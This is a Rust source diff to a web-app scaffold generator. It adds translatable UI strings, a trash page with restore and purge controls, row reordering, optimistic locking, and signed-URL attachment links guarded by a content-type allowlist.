+    // Issue #1349: the export link's text, registered only where the export is
+    // actually emitted so a non-exporting scaffold defines no unused key.
+    // Issue #1349: strings the shared widgets supply by DEFAULT rather than the
+    // templates above — the pager's `aria-label`/Previous/Next, the bulk-delete
+    // submit button and its per-row checkbox `aria-label`. They render in the
+    // generated views like any other button or link, so a scaffold that leaves
+    // them at their English defaults is only partly translated. Each widget
+    // already exposes a setter; the generator just never called them.
+    //
+    // The pager's are inline: `PagerOptions` is built and consumed inside one
+    // statement, so a `&t!(…)` temporary lives long enough. `BulkActionsConfig`
+    // is bound to a `let` that outlives its statement, so its two take bindings.
+    let pager_labels = if labels.enabled() {
+        format!(
+            ".aria_label(&{}).prev_label(&{}).next_label(&{})",
+            labels.lit("common.pagination", "Pagination"),
+            labels.lit("common.previous", "Previous"),
+            labels.lit("common.next", "Next"),
+        )
+    } else {
+        String::new()
+    };
+    let (bulk_label_binds, bulk_labels) = if labels.enabled() && bulk_delete_enabled {
+        (
+            format!(
+                "let l_bulk_submit = {};\n    let l_bulk_select = {};\n    ",
+                labels.lit("common.delete.selected", "Delete selected"),
+                labels.lit("common.select.row", "Select row"),
+            ),
+            ".submit_label(&l_bulk_submit).select_label(&l_bulk_select)".to_owned(),
+        )
+    } else {
+        (String::new(), String::new())
+    };
+    let export_csv_text = if export_enabled {
+        labels.lit("common.export.csv", "Export CSV")
+    } else {
+        String::new()
+    };
+    // Issue #1332: the `GET /{plural}/trash` recycle bin plus its per-row
+    // `POST /{plural}/{id}/restore` and `POST /{plural}/{id}/purge` controls,
+    // finishing #689's AC6. Emitted ONLY for a `--soft-delete` resource — there
+    // is nothing to recover without one — and only on the standard HTML path.
+    //
+    // Gated OFF for:
+    //
+    //   * `--live`/`--live-validation`: `restore` un-deletes through the
+    //     repository's `restore`, which is not the broadcasting `save`, so a
+    //     recovered row would never reach the SSE list — every open index would
+    //     keep showing the record as gone until a manual reload;
+    //   * `--sharded`: `page_only_deleted` refuses to fan out across shards
+    //     (per-shard `LIMIT/OFFSET` cannot be merged into one page), so a trash
+    //     page would silently show one shard's deletions and call it "the trash"
+    //     — the same argument that gates the CSV export off there;
+    //   * an owner-scoped index: there is no owner-filtered deleted-rows scope
+    //     to list through (`list_scoped` has no `only_deleted` sibling, and
+    //     adding one would be new public API, which AC8 rules out). Re-deriving
+    //     the owner filter by hand in a second list handler is exactly how a
+    //     list endpoint leaks another user's rows, so this refuses rather than
+    //     ships a trash page one edit away from being a data leak.
+    //
+    // Must agree exactly with the matching gate in
+    // `plan_scaffold_with_options_impl` (plus `--api`, which emits no HTML
+    // routes module at all), or `main.rs` would mount routes this module never
+    // emitted.
+    let trash_enabled = soft_delete && !live && !live_validation && !sharded && !owner_scoped_index;
+    // Issue #1358: must agree exactly with the matching gate in
+    // `plan_scaffold_with_options_impl` (plus `--api`, which emits no HTML
+    // routes module at all), or `main.rs` would mount routes this module
+    // never emitted. See that gate's comment for the full scope rationale.
+    // `fields` here is actually the caller's `form_fields` (params are named
+    // `fields`/`all_fields` but the call site passes `&form_fields,
+    // &fields`) — a `position` field is always excluded from it (it's
+    // DB-managed, so it's dropped from `metadata.defaults`-filtered form
+    // fields the same way `lock_version` is), so it must be looked up in
+    // `all_fields`, the actual full field list.
+    let position_field = all_fields.iter().find(|f| f.kind.is_position());
+    let reorder_enabled =
+        position_field.is_some() && !live && !live_validation && !sharded && !owner_scoped_index;
+    // Issue #1358: the `position` field's no-JS Move up/down buttons and
+    // their flash message. `move_up`/`move_down` are shared chrome (same
+    // English on every resource, like `common.delete`); the flash bakes in
+    // the resource's own name, so it gets a per-resource key like
+    // `flash_created`/`flash_updated` below. Registered lazily, like
+    // `search_empty`/`search_box_placeholder` above: a scaffold with no
+    // position field never references these, so they must not be defined
+    // in `en.ftl` either, or `autumn i18n check` would flag them unused.
+    let (move_up_button, move_down_button, flash_moved) = if reorder_enabled {
+        (
+            labels.lit("common.move_up", "Move up"),
+            labels.lit("common.move_down", "Move down"),
+            labels.lit(
+                &format!("{snake_name}.flash.moved"),
+                &format!("{pascal_name} moved"),
+            ),
+        )
+    } else {
+        (String::new(), String::new(), String::new())
+    };
+    // Issue #1358: the plain index (and, for the same reason, the CSV
+    // export below) defaults `?sort=` to the position column when the
+    // caller requested none, so a reorderable list renders — and exports —
+    // in its maintained order out of the box rather than primary-key
+    // order — `move_*` would otherwise silently have no visible effect on
+    // load, and a Codex review round caught the export side specifically:
+    // without this, "Export CSV" from a no-`?sort=` position-ordered index
+    // silently downloaded a different row order than what was on screen,
+    // since `export_csv` parses its OWN `ListQuery` from the request
+    // rather than inheriting the index handler's default. Applied only in
+    // the branch `reorder_enabled` targets (the same restriction set); the
+    // sharded/live/owner-scoped index branches keep their existing
+    // (unsorted) queries unchanged.
+    let default_sort_let = position_field.map_or_else(String::new, |pf| {
+        format!(
+            "    let list_query = if list_query.sort().is_none() {{\n        \
+             let __autumn_filters: Vec<(&str, &str)> = list_query.filters().collect();\n        \
+             ListQuery::new(Some(\"{}\"), list_query.direction(), &__autumn_filters)\n    \
+             }} else {{\n        list_query\n    }};\n",
+            pf.name
+        )
+    });
+    // Issue #1332: once a Trash page exists, "{pascal_name} deleted" is no longer
+    // what happened — the row moved somewhere the user can go and get it back,
+    // and the flash is the only place that says so. Every scaffold that emits no
+    // trash surface (including a `--soft-delete` one on a gated-off variant,
+    // where there is nowhere to point them) keeps the original wording.
+    let destroy_flash = if trash_enabled {
+        format!("{pascal_name} moved to Trash")
+    } else {
+        format!("{pascal_name} deleted")
+    };
+    // Issue #1349: the one-shot notices. They are rendered by the layout's
+    // `flash_messages(...)` on the very next page, so a French app that still
+    // toasts "Post created" is not translated — the whole promise of the flag is
+    // that adding a locale means editing a `.ftl`, not Rust.
+    //
+    // Per-resource keys, like the other strings that carry the model's name: a
+    // shared `common.created = { $resource } created` would hand the translator
+    // a sentence whose verb has to agree with a noun they cannot see (French
+    // "créé"/"créée", German word order), which is the same trap `{snake}.new`
+    // avoids. `Flash::success` takes `impl Into<String>`, so a `t!` `String`
+    // drops straight in where the literal was.
+    let flash_created = labels.lit(
+        &format!("{snake_name}.flash.created"),
+        &format!("{pascal_name} created"),
+    );
+    let flash_updated = labels.lit(
+        &format!("{snake_name}.flash.updated"),
+        &format!("{pascal_name} updated"),
+    );
+    let flash_destroyed = labels.lit(&format!("{snake_name}.flash.deleted"), &destroy_flash);
+    // The bulk-delete pair. `Deleted {n} posts` interpolates a COUNT, which is
+    // safe to pass as a Fluent argument (a number carries no gender), unlike the
+    // model noun. A translator wanting real plural rules can turn the value into
+    // a Fluent selector on `$count` without touching Rust.
+    let flash_bulk_cap = if bulk_delete_enabled {
+        labels.expr(
+            &format!("{snake_name}.flash.bulk_cap"),
+            &format!("Select at most {{ $max }} {plural} at once"),
+            &format!("format!(\"Select at most {{MAX_BULK_IDS}} {plural} at once\")"),
+            &[("max", "&MAX_BULK_IDS.to_string()")],
+        )
+    } else {
+        String::new()
+    };
+    let (flash_none_selected, flash_bulk_deleted) = if bulk_delete_enabled {
+        (
+            labels.lit(
+                &format!("{snake_name}.flash.none_selected"),
+                &format!("No {plural} selected"),
+            ),
+            labels.expr(
+                &format!("{snake_name}.flash.bulk_deleted"),
+                &format!("Deleted {{ $count }} {plural}"),
+                &format!("format!(\"Deleted {{}} {plural}\", allowed.len())"),
+                &[("count", "&allowed.len().to_string()")],
+            ),
+        )
+    } else {
+        (String::new(), String::new())
+    };
+    let (flash_restored, flash_purged) = if trash_enabled {
+        (
+            labels.lit(
+                &format!("{snake_name}.flash.restored"),
+                &format!("{pascal_name} restored — it is back in the list"),
+            ),
+            labels.lit(
+                &format!("{snake_name}.flash.purged"),
+                &format!("{pascal_name} permanently deleted"),
+            ),
+        )
+    } else {
+        (String::new(), String::new())
+    };
+    // Registered only where the surface using it is actually emitted: a key
+    // nothing references is exactly what `autumn i18n check --strict` fails on.
+    // The stale-write notice lives in the state-machine transition handler's
+    // 409 branch only, so it needs BOTH a lock column and a `:states(...)`
+    // column — a plain `lock_version` scaffold re-renders the edit form with an
+    // inline banner instead and never flashes.
+    let flash_stale =
+        if lock_version.is_some() && all_fields.iter().any(|f| f.state_machine.is_some()) {
+            labels.lit(
+                &format!("{snake_name}.flash.stale"),
+                &format!(
+                    "This {snake_name} was changed by someone else since this page was loaded. \
+                 Reload and try again."
+                ),
+            )
+        } else {
+            String::new()
+        };
     // The full extractor pair the authorize wiring needs on handlers that do not
     // already carry a `state:` wrapper. No trailing comma — each insertion site
     // supplies its own delimiter.
@@ -1927,17 +4034,6 @@ fn render_routes_file(
     // binds `AppState` directly via the injected `State(state)`.
     let create_update_state_expr = if has_attachments { "&*state" } else { "&state" };
     let edit_destroy_state_expr = "&state";
-    // The attachment `update` handler loads `current` after parsing the multipart
-    // body (to preserve un-replaced blobs); record-authorize the actor against
-    // that same already-loaded row before writing, instead of a second load.
-    // Spliced into `update_new_block` right after its `current` load.
-    let authz_attachment_update = if authorize && has_attachments {
-        format!(
-            "autumn_web::authorization::authorize::<{pascal_name}>({create_update_state_expr}, &session, \"update\", &current).await?;\n    "
-        )
-    } else {
-        String::new()
-    };
     // Every PRESENT `references` field (its target model — and so its
     // `src/schema.rs` entry — is in the project; `missing_reference_targets`
     // excludes the rest, which the caller already warned about and which fall
@@ -2007,7 +4103,12 @@ fn render_routes_file(
                 .map(|d| (f.name.clone(), d))
         })
         .collect();
-    let model_form = render_model_form(pascal_name, fields, validations);
+    let model_form = render_model_form(
+        pascal_name,
+        fields,
+        validations,
+        nesting.map(|n| n.fk.as_str()),
+    );
     // Enum fields need their generated Rust type in scope here — `into_new`
     // parses into it and the `From<&Row>` seed matches against its variants
     // (see `render_model_form`).
@@ -2036,13 +4137,13 @@ fn render_routes_file(
         // Filter on `deleted_at IS NULL` so deleting an already-soft-deleted row
         // affects zero rows and returns 404, matching the physical-delete path.
         format!(
-            "let deleted = diesel::update(\n        {plural}::table.find(*id).filter({plural}::deleted_at.is_null()),\n    )\n        \
+            "let deleted = diesel::update(\n        {plural}::table.{find_expr}.filter({plural}::deleted_at.is_null()),\n    )\n        \
                  .set({plural}::deleted_at.eq(Some(chrono::Utc::now().naive_utc())))\n        \
                  .execute(&mut *db)\n        .await?;"
         )
     } else {
         format!(
-            "let deleted = diesel::delete({plural}::table.find(*id))\n        \
+            "let deleted = diesel::delete({plural}::table.{find_expr})\n        \
                  .execute(&mut *db)\n        .await?;"
         )
     };
@@ -2059,8 +4160,9 @@ fn render_routes_file(
     } else {
         format!(
             "diesel::insert_into({plural}::table)\n        \
-             .values(&new)\n        \
-             .execute(&mut *db)\n        .await?;"
+             .values({insert_record})\n        \
+             .execute(&mut *db)\n        .await?;",
+            insert_record = insert_record_expr(fields),
         )
     };
 
@@ -2081,9 +4183,40 @@ fn render_routes_file(
             )
         }
     } else {
+        // Issue #1318: when the model declares `lock_version`, the write becomes
+        // a compare-and-swap — the expected version is part of the `WHERE`
+        // clause and the bump is part of the same `SET`, so the check and the
+        // increment are one atomic statement with no read-modify-write window.
+        // A concurrent writer that got there first leaves this `UPDATE` matching
+        // zero rows, which the `updated == 0` branch turns into a 409 re-render.
+        // Both fragments are empty without the column, so the emitted statement
+        // stays byte-identical for every other scaffold.
+        let lock_filter = lock_version.map_or_else(String::new, |_| {
+            format!(".filter({plural}::lock_version.eq(expected_lock_version))")
+        });
+        // A scaffold whose every other column is transition-only (issue #1326)
+        // has an empty `update_columns`, so the separator is conditional or the
+        // emitted tuple would start with a stray comma.
+        //
+        // The bump is a plain SQL `+ 1`, which DIVERGES from the repository
+        // path's `wrapping_add(1)` at the column's ceiling: Postgres raises
+        // `integer out of range` where the Rust path would wrap to the minimum.
+        // That is deliberate. Wrapping a lock version is not obviously the safer
+        // behaviour — a wrapped counter can collide with a stale client holding
+        // the same value from a previous cycle, which is the exact failure this
+        // guard exists to prevent — and emulating it would put a `CASE WHEN` in
+        // every scaffolded update forever. Reaching the ceiling organically
+        // takes 2^31 saves of one row; `lock_version:i64` is the answer for a
+        // row that churns that hard. The one *reachable* way to hit it, seeding
+        // a `--default` at the maximum, is refused by
+        // `validate_lock_version_field`.
+        let lock_bump = lock_version.map_or_else(String::new, |_| {
+            let sep = if update_columns.is_empty() { "" } else { ", " };
+            format!("{sep}{plural}::lock_version.eq({plural}::lock_version + 1)")
+        });
         format!(
-            "let updated = diesel::update({plural}::table.find(*id))\n        \
-             .set(({update_columns}))\n        \
+            "let updated = diesel::update({plural}::table.{find_expr}{lock_filter})\n        \
+             .set(({update_columns}{lock_bump}))\n        \
              .execute(&mut *db)\n        .await?;"
         )
     };
@@ -2134,9 +4267,7 @@ fn render_routes_file(
                 "flash: Flash,\n    state: autumn_web::extract::State<autumn_web::AppState>,\n    id: Path<{id_rust}>,\n    mut db: {db_ty},\n    body: Bytes,"
             )
         } else {
-            format!(
-                "flash: Flash,\n    id: Path<{id_rust}>,\n    mut db: {db_ty},\n    body: Bytes,"
-            )
+            format!("flash: Flash,\n    {id_param_decl},\n    mut db: {db_ty},\n    body: Bytes,")
         }
     };
 
@@ -2164,6 +4295,19 @@ fn render_routes_file(
          submit_token: Option<SubmitToken>,\n    submit_field: Option<SubmitFormField>,",
         1,
     );
+
+    // Issue #1349: `create`/`update` re-render the form on a rejected submission,
+    // so they render labels and need the locale. Prepended, keeping `body: Bytes`
+    // last for the same reason the CSRF pair is inserted rather than appended:
+    // axum allows exactly one body-consuming extractor and it must come last.
+    let (create_signature, update_signature) = if labels.enabled() {
+        (
+            format!("locale: Locale, {create_signature}"),
+            format!("locale: Locale,\n    {update_signature}"),
+        )
+    } else {
+        (create_signature, update_signature)
+    };
 
     // Issue #1135: reference selects need a DB handle to load their options
     // in every handler that renders the form. `create`/`update` already carry
@@ -2249,6 +4393,479 @@ fn render_routes_file(
     // splice into the handler templates in place of the plain `let form = …` /
     // `let new = …` lines.
     let attachment_fields: Vec<&Field> = fields.iter().filter(|f| f.kind.is_attachment()).collect();
+
+    // Issue #1236 (AC3, read-back half): a scaffold that streams uploads to the
+    // blob store also has to show what it stored. A `Blob` records the store key,
+    // media type and byte size — not a browser-reachable URL — so the show/edit
+    // views resolve a signed, time-bounded one through the configured
+    // `BlobStore`: the local backend signs a `/_blobs` link, S3 returns a
+    // presigned GET. An app with no `[storage]` backend (or a backend that
+    // refuses to sign) degrades to the stored file's name without a link rather
+    // than failing the whole page.
+    // Issue #1349: the meta span beside the link — `(image/png, 17 bytes)` — is
+    // user-facing text like every other string this flag claims, so the WHOLE
+    // parenthesised pattern comes from the bundle rather than just the word
+    // "bytes": a translator has to reorder it, repunctuate it, and choose the
+    // unit noun (and whether it agrees with the number). The media type and the
+    // count interpolate as Fluent arguments — they are data, not language.
+    //
+    // That means `attachment_link` needs a `Locale`, which is why it takes one
+    // under `--i18n` and not otherwise: both call sites are view handlers that
+    // already hold it, and the non-i18n helper must stay byte-for-byte as it
+    // was. `media`, not `type`, because the argument name becomes a Rust
+    // identifier in the `t!` expansion and `type` is a keyword.
+    let attachment_locale_param = if labels.enabled() {
+        "locale: &autumn_web::i18n::Locale,\n    "
+    } else {
+        ""
+    };
+    let attachment_locale_arg = if labels.enabled() { "&locale, " } else { "" };
+    // Recorded only when the helper is actually emitted: `markup_expr` adds the
+    // key to `used_keys`, and a key written to `en.ftl` that no generated view
+    // references is exactly what `autumn i18n check --strict` fails on. A
+    // scaffold with no attachment column must not carry this key.
+    let attachment_meta_markup = if has_attachments {
+        labels.markup_expr(
+            "common.attachment.meta",
+            "({ $media }, { $size } bytes)",
+            "\"(\" (blob.content_type) \", \" (blob.byte_size) \" bytes)\"",
+            &[
+                ("media", "&blob.content_type"),
+                ("size", "&blob.byte_size.to_string()"),
+            ],
+        )
+    } else {
+        String::new()
+    };
+    let attachment_read_back_helpers = if has_attachments {
+        format!(
+            "\n/// The dot-extension to give a stored blob, derived from the browser-supplied\n\
+             /// filename so a downloaded file still opens in the right application.\n\
+             ///\n\
+             /// Deliberately paranoid: the submitted name is attacker-controlled and this\n\
+             /// becomes part of a `BlobStore` key, so only a short run of ASCII\n\
+             /// alphanumerics survives — lowercased, because keys must be lowercase and\n\
+             /// portable across the local and S3 backends — and `.meta` (reserved by the\n\
+             /// local backend for its sidecar files) is dropped. Returns `\"\"` when there\n\
+             /// is nothing safe to use; the unique part of the key is the timestamp +\n\
+             /// UUID in front of it either way.\n\
+             fn upload_extension(file_name: Option<&str>) -> String {{\n    \
+             let ext = file_name\n        \
+             .and_then(|name| name.rsplit(['/', '\\\\']).next())\n        \
+             .and_then(|name| name.rsplit_once('.'))\n        \
+             .map(|(_, ext)| ext.to_ascii_lowercase())\n        \
+             .unwrap_or_default();\n    \
+             if ext.is_empty()\n        \
+             || ext.len() > 8\n        \
+             || ext == \"meta\"\n        \
+             || !ext.chars().all(|c| c.is_ascii_alphanumeric())\n    \
+             {{\n        \
+             return String::new();\n    \
+             }}\n    \
+             format!(\".{{ext}}\")\n\
+             }}\n\n\
+             /// Media types this scaffold is willing to hand out a URL for.\n\
+             ///\n\
+             /// SECURITY: the local backend serves blobs from THIS app's origin and\n\
+             /// replays the content type they were uploaded under, setting no\n\
+             /// `Content-Disposition`; the default CSP allows `script-src 'self'`. So a\n\
+             /// stored `text/html` or `image/svg+xml` reached by direct NAVIGATION would\n\
+             /// run as same-origin script with the visitor's cookies — and an anchor's\n\
+             /// `download` attribute governs clicks on that anchor, not navigation to\n\
+             /// the URL. A URL is therefore only ever issued for types a browser either\n\
+             /// renders inertly (images, PDF, plain text, media) or simply downloads\n\
+             /// (archives, office documents); an unlisted type still shows on the page,\n\
+             /// just without a link.\n\
+             ///\n\
+             /// Fail-CLOSED by design. Widen it freely for inert types you accept, but\n\
+             /// do NOT add `text/html`, `application/xhtml+xml`, `image/svg+xml`, any\n\
+             /// `*/xml`, or any script type unless you are serving uploads from a\n\
+             /// SEPARATE origin. Constraining `security.upload.allowed_mime_types` in\n\
+             /// `autumn.toml` is the complementary control on the write side.\n\
+             const LINKABLE_CONTENT_TYPES: &[&str] = &[\n    \
+             // Rendered inertly by the browser.\n    \
+             \"image/png\",\n    \
+             \"image/jpeg\",\n    \
+             \"image/gif\",\n    \
+             \"image/webp\",\n    \
+             \"image/avif\",\n    \
+             \"image/bmp\",\n    \
+             \"application/pdf\",\n    \
+             \"text/plain\",\n    \
+             \"text/csv\",\n    \
+             \"audio/mpeg\",\n    \
+             \"audio/ogg\",\n    \
+             \"audio/wav\",\n    \
+             \"video/mp4\",\n    \
+             \"video/webm\",\n    \
+             // No inline renderer, so the browser downloads rather than executes.\n    \
+             \"application/zip\",\n    \
+             \"application/gzip\",\n    \
+             \"application/octet-stream\",\n    \
+             \"application/msword\",\n    \
+             \"application/vnd.ms-excel\",\n    \
+             \"application/vnd.openxmlformats-officedocument.wordprocessingml.document\",\n    \
+             \"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\",\n    \
+             \"application/vnd.openxmlformats-officedocument.presentationml.presentation\",\n\
+             ];\n\n\
+             /// Signed, time-bounded URL for a stored attachment (issue #1236).\n\
+             ///\n\
+             /// `None` — so `attachment_link` renders the file name without a link\n\
+             /// rather than failing the page — when the column is NULL, the app has no\n\
+             /// `[storage]` backend configured, the media type is not in\n\
+             /// `LINKABLE_CONTENT_TYPES`, the blob belongs to a different storage\n\
+             /// provider, or the backend declined to sign.\n\
+             ///\n\
+             /// The {ATTACHMENT_URL_TTL_SECS}-second window is set here, not read from\n\
+             /// config: `storage.local.default_url_expiry_secs` applies only when the\n\
+             /// caller passes `Duration::ZERO`, and the S3 backend has no such fallback.\n\
+             /// Change the literal below to widen or narrow it.\n\
+             async fn attachment_url(\n    \
+             state: &autumn_web::AppState,\n    \
+             blob: Option<&autumn_web::storage::Blob>,\n\
+             ) -> Option<String> {{\n    \
+             let blob = blob?;\n    \
+             // Compare on the media-type ESSENCE: a stored type may carry parameters\n    \
+             // (`text/plain; charset=utf-8`).\n    \
+             let essence = blob\n        \
+             .content_type\n        \
+             .split(';')\n        \
+             .next()\n        \
+             .unwrap_or_default()\n        \
+             .trim()\n        \
+             .to_ascii_lowercase();\n    \
+             if !LINKABLE_CONTENT_TYPES.contains(&essence.as_str()) {{\n        \
+             return None;\n    \
+             }}\n    \
+             let store = state\n        \
+             .extension::<autumn_web::storage::BlobStoreState>()?\n        \
+             .store()\n        \
+             .clone();\n    \
+             // A blob recorded against a different provider is not this store's object.\n    \
+             // Signing its key would produce a link to nothing — or, if that key happens\n    \
+             // to exist here, to unrelated bytes. `Blob::provider_id` exists to catch\n    \
+             // exactly this after a backend swap.\n    \
+             if blob.provider_id != store.provider_id() {{\n        \
+             autumn_web::reexports::tracing::warn!(\n            \
+             blob_provider = %blob.provider_id,\n            \
+             store_provider = %store.provider_id(),\n            \
+             key = %blob.key,\n            \
+             \"attachment belongs to a different storage provider; rendering it without a link\"\n        \
+             );\n        \
+             return None;\n    \
+             }}\n    \
+             match store\n        \
+             .presigned_url(&blob.key, std::time::Duration::from_secs({ATTACHMENT_URL_TTL_SECS}))\n        \
+             .await\n    \
+             {{\n        \
+             Ok(url) => Some(url),\n        \
+             Err(err) => {{\n            \
+             autumn_web::reexports::tracing::warn!(\n                \
+             error = %err,\n                \
+             key = %blob.key,\n                \
+             \"could not sign a URL for a stored attachment; rendering it without a link\"\n            \
+             );\n            \
+             None\n        \
+             }}\n    \
+             }}\n\
+             }}\n\n\
+             /// Render a stored attachment: a download link when a signed URL is\n\
+             /// available, the file name alone when it isn't, and an em dash when the\n\
+             /// column is NULL. `label` is the column's name — `Blob` records the store\n\
+             /// key, media type and size but not the original filename, so the link is\n\
+             /// labelled `<label>.<ext>` rather than with the opaque key.\n\
+             ///\n\
+             /// The link carries `download` so a same-origin click SAVES the file rather\n\
+             /// than rendering it in a tab. It is a convenience, NOT the security\n\
+             /// boundary — it governs clicks on this anchor only, and browsers ignore it\n\
+             /// entirely for the cross-origin URL an S3 backend returns (so an S3-hosted\n\
+             /// image opens inline instead of saving; encode a response\n\
+             /// `Content-Disposition` into the presign if that matters to you). What\n\
+             /// actually keeps a stored `.html`/`.svg` from running as same-origin script\n\
+             /// is `attachment_url` refusing to issue a URL for it at all — see\n\
+             /// `LINKABLE_CONTENT_TYPES`.\n\
+             ///\n\
+             /// Emitted as a raw `<a>` rather than `autumn_web::a11y::Link` because that\n\
+             /// primitive has no `download` builder.\n\
+             fn attachment_link(\n    \
+             {attachment_locale_param}blob: Option<&autumn_web::storage::Blob>,\n    \
+             url: Option<&str>,\n    \
+             label: &str,\n\
+             ) -> Markup {{\n    \
+             let Some(blob) = blob else {{\n        \
+             return html! {{ \"—\" }};\n    \
+             }};\n    \
+             let file_name = match blob.key.rsplit('/').next().and_then(|s| s.rsplit_once('.')) {{\n        \
+             Some((_, ext)) => format!(\"{{label}}.{{ext}}\"),\n        \
+             None => label.to_owned(),\n    \
+             }};\n    \
+             html! {{\n        \
+             @if let Some(url) = url {{\n            \
+             a href=(url) download=(file_name) {{ (file_name) }}\n        \
+             }} @else {{\n            \
+             span {{ (file_name) }}\n        \
+             }}\n        \
+             \" \"\n        \
+             span class=\"autumn-attachment__meta\" {{ {attachment_meta_markup} }}\n    \
+             }}\n\
+             }}\n"
+        )
+    } else {
+        String::new()
+    };
+
+    // The `show` detail page resolves one signed URL per attachment column
+    // before building its property list. The list index deliberately does NOT:
+    // `widgets::Column`'s cell closure is SYNCHRONOUS and `presigned_url` is
+    // async, so there is nowhere to await it. (Signing itself is cheap and
+    // local — an HMAC for the local backend, local SigV4 for S3 — so cost is
+    // not the reason; the index stays a presence marker.)
+    // Two spellings of the same binds. `&state` would compile at both sites
+    // (`&&AppState` reborrows), but generated code is user-owned code: emitting
+    // `&state` where `state` is already a `&AppState` trips
+    // `clippy::needless_borrow` in the app's own lint run. The `show` handler
+    // owns a `State<_>` wrapper and needs the borrow; the state-machine
+    // `show_view` helper is handed a `&AppState` and must not add one.
+    // `authorize` destructures `State(state)` to a bare `AppState`; the
+    // unauthorized form keeps the `State<_>` wrapper and needs the borrow.
+    let show_state_recv = if authorize { "&state" } else { "&*state" };
+    let mut show_attachment_url_binds = String::new();
+    let mut show_view_attachment_url_binds = String::new();
+    for f in &attachment_fields {
+        let name = &f.name;
+        let _ = writeln!(
+            show_attachment_url_binds,
+            "    let {name}_url = attachment_url({show_state_recv}, row.{name}.as_ref()).await;"
+        );
+        let _ = writeln!(
+            show_view_attachment_url_binds,
+            "    let {name}_url = attachment_url(state, row.{name}.as_ref()).await;"
+        );
+    }
+    // `show` never carried a `State` extractor — it does no authorization. An
+    // attachment scaffold adds one, because rendering the stored file needs the
+    // blob store.
+    //
+    // SECURITY (issue #1236 review): it also adds the record-policy check that
+    // `show` has never had. Before this slice the detail page disclosed only the
+    // word "attachment"; now it hands out a signed `presigned_url`, and the
+    // serving route validates that signature ALONE — no session, no policy — so
+    // the rendered link is a working bearer capability for the bytes for as long
+    // as it is valid. Emitting it from a handler that never consults
+    // `can_show` would make the generated `Policy`'s "Reads are public by
+    // default. Tighten this if shows should be gated." comment a lie for the one
+    // column where it matters most. Under the generated default policy
+    // (`can_show` -> true) this is a no-op; it starts enforcing the moment an
+    // author narrows it. Scaffolds with no attachment column keep the historical
+    // unauthorized `show` — closing that generally is a separate change.
+    let (show_state_param, show_state_param_line, show_authz_call) = if has_attachments && authorize
+    {
+        (
+            ", autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>, session: autumn_web::session::Session",
+            "\n    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\n    session: autumn_web::session::Session,",
+            format!(
+                "    autumn_web::authorization::authorize::<{pascal_name}>(&state, &session, \"show\", &row).await?;\n"
+            ),
+        )
+    } else if has_attachments {
+        (
+            ", state: autumn_web::extract::State<autumn_web::AppState>",
+            "\n    state: autumn_web::extract::State<autumn_web::AppState>,",
+            String::new(),
+        )
+    } else {
+        ("", "", String::new())
+    };
+    // The state-machine variant renders through a shared `show_view` helper
+    // called by `show` and by each transition handler's 422 re-render, so the
+    // state travels as a plain `&AppState` argument. `&state` coerces to it from
+    // either binding shape — the `State<_>` wrapper `show` takes, or the
+    // already-destructured `AppState` the authorize wiring injects.
+    let (show_view_state_param, show_view_state_arg_call) = if has_attachments {
+        ("\n    state: &autumn_web::AppState,", ", &state")
+    } else {
+        ("", "")
+    };
+
+    // The edit form shows which file is already stored: a file `<input>` can't
+    // be repopulated (browser security), so without this the author has no way
+    // to tell an empty column from one holding a blob they simply didn't
+    // replace. Both live in the SHARED edit body, so `GET /{plural}/{id}/edit`
+    // and every 422 re-render of that form show the same thing — which is why
+    // `update` loads `current` before validating (see `update_load_and_authorize_block`).
+    //
+    // The shared body reads the row through a binding named `current` — the name
+    // `update` already uses — so `edit_form` renames its own loaded row to match
+    // once the changeset has been seeded from it.
+    let edit_current_bind = if has_attachments {
+        "// `current` is the name the shared edit body — and `update`, which\n             // re-renders that same body at 422 — reads the row through, so the\n             // stored-attachment block below can't drift between the two.\n             let current = row;\n    "
+    } else {
+        ""
+    };
+    // Issue #1318: the two bindings the shared edit body reads for optimistic
+    // locking. `edit_form` renders the row's live version and never shows the
+    // conflict banner — it is the *first* look at the record, so there is
+    // nothing to have lost a race to yet. `update`'s re-render branches bind the
+    // same two names to their own values (see `update_lock_version_preamble` and
+    // `update_zero_rows_block`), which is what lets one body serve all three
+    // sites without drifting.
+    let edit_lock_binds = if lock_version.is_some() {
+        "let lock_version_value = row.lock_version;\n    let lock_conflict = false;\n    "
+    } else {
+        ""
+    };
+    // `edit_form` authorizes by default and so already owns a destructured
+    // `state`; `--no-policy` scaffolds add their own wrapper.
+    let edit_form_state_param = if has_attachments && !authorize {
+        "\n    state: autumn_web::extract::State<autumn_web::AppState>,"
+    } else {
+        ""
+    };
+    let mut edit_attachment_url_binds = String::new();
+    let mut edit_current_attachment_markup = String::new();
+    for f in &attachment_fields {
+        let name = &f.name;
+        let label = humanize_label(name);
+        // Issue #1349: "Current Cover:" names the file already stored, so it is
+        // a view label like any other. Per FIELD, not a shared pattern with the
+        // column name interpolated — same grammatical-agreement reasoning as
+        // `{snake}.new`. The `attachment_link` argument beside it stays the raw
+        // column name on purpose: it is the DOWNLOAD FILENAME stem, not a label,
+        // and localizing a filename is a bug, not a feature.
+        let current_label = labels.markup(
+            &format!("{snake_name}.attachment.{name}.current"),
+            &format!("Current {label}: "),
+        );
+        let _ = writeln!(
+            edit_attachment_url_binds,
+            "        let {name}_url = attachment_url(&state, current.{name}.as_ref()).await;"
+        );
+        let _ = write!(
+            edit_current_attachment_markup,
+            "@if let Some(blob) = current.{name}.as_ref() {{\n            \
+             p class=\"autumn-field__current\" {{ {current_label} (attachment_link({attachment_locale_arg}Some(blob), {name}_url.as_deref(), \"{name}\")) }}\n        \
+             }}\n        "
+        );
+    }
+
+    // The read-back helpers are pure functions, so the scaffold ships real unit
+    // tests for them right next to the code — `cargo test` in the generated app
+    // exercises the em-dash / no-link / labelled-link branches and the
+    // key-sanitizing rules, rather than leaving them proven only by the
+    // generator's own string assertions. They live INSIDE the routes module
+    // because a `tests/` integration binary cannot import a project's bin crate.
+    // Under `--i18n` the helper takes a `Locale`, so the tests build one. It
+    // carries a real one-key bundle rather than the bare `Locale::new` (whose
+    // lookups fall back to the key itself): that keeps these assertions about
+    // the RENDERED meta — the media type and byte count still have to reach the
+    // string — instead of degrading them to "some key was looked up".
+    let (attachment_test_locale_helper, attachment_test_locale_arg) = if labels.enabled() {
+        (
+            r#"
+    fn locale() -> autumn_web::i18n::Locale {
+        let mut en = std::collections::HashMap::new();
+        en.insert(
+            "common.attachment.meta".to_owned(),
+            "({ $media }, { $size } bytes)".to_owned(),
+        );
+        let mut messages = std::collections::HashMap::new();
